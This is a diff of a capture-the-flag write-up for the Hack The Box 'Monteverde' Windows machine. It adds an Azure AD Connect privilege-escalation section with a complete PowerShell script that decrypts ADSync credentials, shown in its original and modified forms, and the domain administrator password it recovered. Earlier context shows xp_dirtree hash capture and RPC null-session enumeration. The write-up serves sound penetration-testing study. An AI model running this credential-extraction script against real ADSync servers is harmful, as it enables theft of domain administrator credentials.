@@ -1,6 +1,6 @@
 # Key Takeaways
 - When password spraying, it is usually worth trying the username as the password to look for easy wins (user.txt).
-- If permissions are available, look to Azure AD, ADSync for possible credentials/vulnerabilities (root.txt).
+- If permissions are available and Azure AD is in use, look to Azure AD + ADSync for possible credentials/vulnerabilities (root.txt).
 
 # Overview
 - Platform: Windows
@@ -66,8 +66,8 @@ PORT      STATE SERVICE
 ```
 
 Right away, I was interested in seeing if we can extract any information from the open ports for SMB (445) or DNS (53). DNS didn't return anything particularly useful.
-└──╼ $dig any megabank.local @10.10.10.172
 ```
+└──╼ $dig any megabank.local @10.10.10.172
 ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any megabank.local @10.10.10.172
 ;; global options: +cmd
 ;; Got answer:
@@ -116,7 +116,7 @@ do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-With this information, I then attemted to extra more information via an RPC null session, was was successful. We are able to retrieve a list of valid domain user accounts, alongside domain and password policy information.
+With this information, I then attempted to extract more information via an RPC null session, which was successful. We are able to retrieve a list of valid domain user accounts, alongside domain and password policy information.
 ```
 └──╼ $rpcclient -U "" -N 10.10.10.172
 rpcclient $> getdompwinfo
@@ -425,7 +425,7 @@ Microsoft SQL Server 2017 (RTM-GDR) (KB4505224) - 14.0.2027.2 (X64)
 (1 rows affected)
 ```
 
-I then attempted to see if we could escalated privleges via xp_cmdshell, however we did not have the permission to enable that. I did however note that we could use `xp_dirtree`. I used this to "authenticate" against my local machine and grab the `MONTEVERDE$` machine account NTLMv2 hash.
+I then attempted to see if we could escalated privileges via xp_cmdshell, however we did not have the permission to enable that. I did however note that we could use `xp_dirtree`. I used this to "authenticate" against my local machine and grab the `MONTEVERDE$` machine account NTLMv2 hash.
 
 ```
 *Evil-WinRM* PS C:\Program Files\Microsoft SQL Server> sqlcmd -S localhost -E -q "EXEC master..xp_dirtree '\\10.10.10.10\share\'"
@@ -504,4 +504,138 @@ C:\Users\Administrator\Desktop> type root.txt
 ```
 
 # Solving root.txt (Azure AD)
-After a glance at a write-up mentioning a separate way to gain access to the administrator account, I went back to the machine to figure out how that works. I started with the SQL Server instance, as I didn't end up fully enumerating that.
+After a glance at a write-up mentioning a separate way to gain access to the administrator account, I went back to the machine to figure out how that works. I started with the SQL Server instance, as I didn't end up fully enumerating that. A look at what databases we have access to shows that there is a non-standard `ADSync` database.
+
+```
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -S MONTEVERDE -Q "SELECT name FROM master.sys.databases;"
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+ADSync
+```
+
+I then started looking for information on this as I had no idea what table to look in from here. A Google search of "ADSync Vulnerability" turns up some interesting articles, [this](https://blog.xpnsec.com/azuread-connect-for-redteam/) one goes over numerous potential vulnerabilities.
+
+The article notes that the ADSync database contains encrypted credentials for the ADSync account within the `mms_management_agent` table. To decrypt the credentials, the database passes 3 pieces of information to the `mcrypt.dll` file found in the ADSync installation directory.
+1. keyset_id
+2. instance_id
+3. entropy
+
+All of these can be found within the table `mms_server_configuration`. That said, the article contains a powershell script that can be used to decrypt the credentials for us (but requires a small tweak).
+```
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+
+I copied this onto the machine and tried running it, however it hung for awhile and then returned an error.
+```
+*Evil-WinRM* PS C:\Users\mhope\Documents> .\azuread_decrypt_msol.ps1
+AD Connect Sync Credential Extract POC (@_xpn_)
+
+Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 3221225477]: <f:WSManFault Code='3221225477' Machine='10.10.10.172' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message><f:ProviderFault path='C:\Windows\system32\pwrshplugin.dll' provider='microsoft.powershell'/></f:Message></f:WSManFault>
+
+Error: Exiting with code 1
+```
+
+After re-reading the article, I noticed that the author was using the `SqlLocalDb.exe` tool, however our installation seems to be a bit different as we do not have this tool located in the mentioned directory: `C:\Program Files\Microsoft SQL Server\110\Tools\Binn\`. This means that more than likely, the connection string within the PowerShell script simply isn't using proper syntax to connect to the DB. I referenced [this](https://www.connectionstrings.com/sql-server/) MSSQL Server documentation to find what connection string might work and decided to use: `Server=myServerAddress;Database=myDataBase;Trusted_Connection=True;`.
+
+I confirmed the server name via the following command.
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd -S localhost -E -q "SELECT @@SERVERNAME"
+
+--------------------------------------------------------------------------------------------------------------------------------
+MONTEVERDE
+```
+
+I then filled in the name of the database we will be using, `ADSync`, and then replaced the old connection string in the script with our new one: `Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true`.
+
+This resulted in the following script:
+```
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+
+I then transferred the script and ran it on the machine, which returned the administrator credentials.
+```
+*Evil-WinRM* PS C:\Users\mhope\Documents> .\testadconnect.ps1
+AD Connect Sync Credential Extract POC (@_xpn_)
+
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+```
